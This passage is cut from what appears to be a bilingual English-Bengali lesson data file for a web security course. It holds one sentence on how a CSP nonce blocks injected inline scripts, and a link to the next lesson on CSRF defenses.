          en: 'Even if an attacker finds an injection sink, CSP blocks execution of the injected inline script unless the attacker can forge a cryptographic nonce.',
          bn: 'আক্রমণকারী কোনো ইনজেকশন পেলেও CSP ইনলাইন স্ক্রিপ্ট চালানো আটকে দেয়, যদি না আক্রমণকারী ক্রিপ্টোগ্রাফিক নন্স অনুমান করতে পারে।'
        },
      },
    ],
  },
  next: {
    slug: 'csrf-defense',
    title: {
      en: 'Cross-Site Request Forgery (CSRF): Tokens, SameSite Cookies & Defense',
      bn: 'ক্রস-সাইট রিকোয়েস্ট ফোরজারি (CSRF): টোকেন, SameSite কুকি এবং প্রতিরোধ'
    },
  },
};
